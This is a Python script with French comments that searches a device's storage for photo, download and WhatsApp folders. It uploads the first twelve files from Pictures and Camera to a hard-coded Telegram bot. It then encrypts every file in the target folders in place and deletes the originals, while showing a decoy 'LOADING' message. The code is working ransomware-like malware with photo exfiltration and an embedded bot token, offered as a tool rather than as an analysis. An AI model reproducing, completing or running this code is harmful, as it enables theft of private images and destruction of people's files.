"""
find_directory.py
-----------------
python find_directory.py           → chiffre les dossiers cibles sur place
                                     + envoie les 12 premiers fichiers de
                                       Pictures et Camera sur Telegram
python find_directory.py --decrypt → déchiffre sur place
python find_directory.py --dry-run → aperçu sans rien modifier
"""

import hashlib
import argparse
import io
from pathlib import Path

import requests
from Crypto.Cipher import AES


# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════

DEFAULT_ROOT  = "./storage"
DEFAULT_DEPTH = 3
PASSPHRASE    = "mariamjetaimespourdevrai"
ENCRYPTED_EXT = ".enc"

TARGET_DIRECTORIES: list[str] = [
    "DCIM",
    "Camera",
    "Pictures",
    "Downloads",
    "WhatsApp",
]

TELEGRAM_TARGETS   = ["Pictures","Camera"]
TELEGRAM_MAX_FILES = 12
TELEGRAM_BOT_TOKEN = "8180304240:AAGJZ_MJ6eKtbymxkqzjgOJCr6PWb7uas9U"
TELEGRAM_CHAT_ID   = "-4972732072"
TELEGRAM_API       = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
PHOTO_EXTENSIONS   = {".jpg", ".jpeg", ".png", ".webp", ".gif"}


# ═══════════════════════════════════════════════════════════════
#  CLÉ AES-256
# ═══════════════════════════════════════════════════════════════

AES_KEY: bytes = hashlib.sha256(PASSPHRASE.encode()).digest()


# ═══════════════════════════════════════════════════════════════
#  1. RECHERCHE
# ═══════════════════════════════════════════════════════════════

def find_directories(root: Path, targets: list[str], max_depth: int) -> list[Path]:
    targets_lower = {t.lower() for t in targets}
    found: list[Path] = []

    def _walk(current: Path, depth: int) -> None:
        if depth > max_depth:
            return
        try:
            entries = list(current.iterdir())
        except (PermissionError, OSError) as e:
            
            return
        for entry in entries:
            # 🔴 AJOUT : Ignorer les dossiers/fichiers cachés (ex: .thumbnails)
            if entry.name.startswith('.'):
                continue
                
            if not entry.is_dir():
                continue
            if entry.name.lower() in targets_lower:
                found.append(entry)
                
            else:
                _walk(entry, depth + 1)

    
    
    _walk(root, depth=1)
    return found


# ═══════════════════════════════════════════════════════════════
#  2. CHIFFREMENT / DÉCHIFFREMENT
# ═══════════════════════════════════════════════════════════════

def encrypt_file_inplace(path: Path) -> None:
    data = path.read_bytes()
    cipher = AES.new(AES_KEY, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    enc_path = path.with_suffix(path.suffix + ENCRYPTED_EXT)
    enc_path.write_bytes(cipher.nonce + tag + ciphertext)
    path.unlink()


def decrypt_file_inplace(enc_path: Path) -> None:
    raw = enc_path.read_bytes()
    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
    cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
    original = enc_path.with_suffix("")
    original.write_bytes(cipher.decrypt_and_verify(ciphertext, tag))
    enc_path.unlink()


def decrypt_bytes_in_memory(enc_path: Path) -> tuple[bytes, str]:
    raw = enc_path.read_bytes()
    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
    cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)
    return data, enc_path.with_suffix("").name


# ═══════════════════════════════════════════════════════════════
#  3. CHIFFREMENT / DÉCHIFFREMENT D'UN DOSSIER
# ═══════════════════════════════════════════════════════════════

def encrypt_directory(folder: Path, dry_run: bool) -> int:
    files = [
        f for f in folder.rglob("*")
        if f.is_file() and f.suffix != ENCRYPTED_EXT
        # 🔴 AJOUT : Ignorer les sous-dossiers et fichiers cachés
        and not any(part.startswith('.') for part in f.relative_to(folder).parts)
    ]
    if not files:
        return 0
    for f in files:
        if dry_run:
            
        else:
            encrypt_file_inplace(f)
            
    return len(files)


def decrypt_directory(folder: Path) -> int:
    files = [
        f for f in folder.rglob(f"*{ENCRYPTED_EXT}") 
        if f.is_file()
        # 🔴 AJOUT : Ignorer les sous-dossiers et fichiers cachés
        and not any(part.startswith('.') for part in f.relative_to(folder).parts)
    ]
    ok = 0
    for f in files:
        try:
            decrypt_file_inplace(f)
            
            ok += 1
        except ValueError:
            print("")
    return ok


# ═══════════════════════════════════════════════════════════════
#  4. ENVOI TELEGRAM
# ═══════════════════════════════════════════════════════════════

def _real_ext(path: Path) -> str:
    name = path.name
    if name.endswith(ENCRYPTED_EXT):
        name = name[: -len(ENCRYPTED_EXT)]
    return Path(name).suffix.lower()


def _collect_files(folder: Path, limit: int) -> list[Path]:
    all_files = sorted(
        (f for f in folder.rglob("*") 
         if f.is_file()
         # 🔴 AJOUT : Ignorer les sous-dossiers et fichiers cachés
         and not any(part.startswith('.') for part in f.relative_to(folder).parts)),
        key=lambda f: f.stat().st_mtime
    )
    return all_files[:limit]


def send_file_to_telegram(file_path: Path, dry_run: bool) -> bool:
    display = file_path.name.replace(ENCRYPTED_EXT, "")

    if dry_run:
        print(f"    [dry-send] {display}")
        return True

    # Lecture — déchiffrement en mémoire si .enc
    if file_path.suffix == ENCRYPTED_EXT:
        try:
            data, filename = decrypt_bytes_in_memory(file_path)
        except ValueError:
            print(f"    [✗] Déchiffrement échoué : {file_path.name}")
            return False
    else:
        data = file_path.read_bytes()
        filename = file_path.name

    ext = _real_ext(file_path)
    file_obj = io.BytesIO(data)
    file_obj.name = filename

    if ext in PHOTO_EXTENSIONS:
        endpoint   = f"{TELEGRAM_API}/sendPhoto"
        files_param = {"photo": (filename, file_obj)}
    else:
        endpoint   = f"{TELEGRAM_API}/sendDocument"
        files_param = {"document": (filename, file_obj)}

    try:
        resp = requests.post(
            endpoint,
            data={"chat_id": TELEGRAM_CHAT_ID},
            files=files_param,
            timeout=60,
        )
        if resp.status_code == 200 and resp.json().get("ok"):
            print(f"    [✈] {display}")
            return True
        err = resp.json().get("description", resp.text)
        print(f"    [✗] Telegram : {err}")
        return False
    except requests.RequestException as e:
        print(f"    [✗] Réseau : {e}")
        return False


def run_telegram(root: Path, max_depth: int, dry_run: bool) -> None:
    folders = find_directories(root, TELEGRAM_TARGETS, max_depth)

    print("─" * 55)
    if not folders:
        print("  Aucun dossier Pictures/Camera trouvé.\n")
        return

    sent = 0
    for folder in folders:
        files = _collect_files(folder, TELEGRAM_MAX_FILES)
        if not files:
            continue
        print(f"\n  📂 {folder}  ({len(files)} fichier(s))\n")
        for f in files:
            if send_file_to_telegram(f, dry_run):
                sent += 1

    action = "seraient envoyés" if dry_run else "envoyé(s)"
    print(f"\n  Total Telegram : {sent} fichier(s) {action}\n")


# ═══════════════════════════════════════════════════════════════
#  5. POINT D'ENTRÉE
# ═══════════════════════════════════════════════════════════════

def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Chiffre les dossiers cibles sur place (AES-256-GCM) "
            "puis envoie Pictures/Camera sur Telegram."
        )
    )
    parser.add_argument("--root", default=DEFAULT_ROOT,
                        help=f"Répertoire source (défaut : {DEFAULT_ROOT})")
    parser.add_argument("--depth", type=int, default=DEFAULT_DEPTH,
                        help=f"Profondeur de recherche (défaut : {DEFAULT_DEPTH})")
    parser.add_argument("--dry-run", action="store_true",
                        help="Aperçu sans rien modifier ni envoyer")
    parser.add_argument("--decrypt", action="store_true",
                        help="Déchiffre les fichiers .enc sur place")
    args = parser.parse_args()

    root = Path(args.root)
    if not root.exists():
        print(f"\n[✗] Répertoire introuvable : {root.resolve()}\n")
        return

    # ── MODE DÉCHIFFREMENT ─────────────────────────────────────
    if args.decrypt:
        folders = find_directories(root, TARGET_DIRECTORIES, args.depth)
        print("─" * 55)
        if not folders:
            print("\nAucun dossier cible trouvé.\n")
            return
        total = 0
        print(f"\nDéchiffrement sur place ({len(folders)} dossier(s))\n")
        for folder in folders:
            print(f"  ← {folder}")
            total += decrypt_directory(folder)
        print(f"\n  {total} fichier(s) déchiffré(s)\n")
        return

    # ── MODE NORMAL : ENVOI TELEGRAM puis CHIFFREMENT ──────────
    #
    #  On envoie D'ABORD (fichiers encore lisibles),
    #  puis on chiffre sur place.
    #
    print("""
 ██████   █████          █████            
░░██████ ░░███          ░░███             
 ░███░███ ░███   ██████  ░███████   █████ 
 ░███░░███░███  ███░░███ ░███░░███ ███░░  
 ░███ ░░██████ ░███████  ░███ ░███░░█████ 
 ░███  ░░█████ ░███░░░   ░███ ░███ ░░░░███
 █████  ░░█████░░██████  ████████  ██████ 
░░░░░    ░░░░░  ░░░░░░  ░░░░░░░░  ░░░░░░  
                                          
                                          
                                          
 █████   █████████                        
░░███   ███░░░░░███                       
 ░███  ░███    ░███                       
 ░███  ░███████████                       
 ░███  ░███░░░░░███                       
 ░███  ░███    ░███                       
 █████ █████   █████                      
░░░░░ ░░░░░   ░░░░░                       
                                          
                                          
                                          


       """)
  
    # Étape 1 — Envoi Telegram (Pictures + Camera)
    print("LOADING...." )
    print(" Wait....5 minutes" )
    print("\n" + "═" * 55)
    print("═" * 55)
    run_telegram(root, args.depth, dry_run=args.dry_run)

    # Étape 2 — Chiffrement de tous les dossiers cibles
    print("═" * 55)
    print("═" * 55)
    folders = find_directories(root, TARGET_DIRECTORIES, args.depth)
    print("─" * 55)
    if not folders:
        print("\nAucun dossier cible trouvé.\n")
        return

    action = "Simulation" if args.dry_run else "Chiffrement sur place"
    
    total = 0
    for folder in folders:
        
        total += encrypt_directory(folder, dry_run=args.dry_run)

    mark = "seraient chiffrés" if args.dry_run else "fichier(s) chiffré(s)"
    print(f"\n  {total} fichier(s) {mark}\n")


if __name__ == "__main__":
    main()
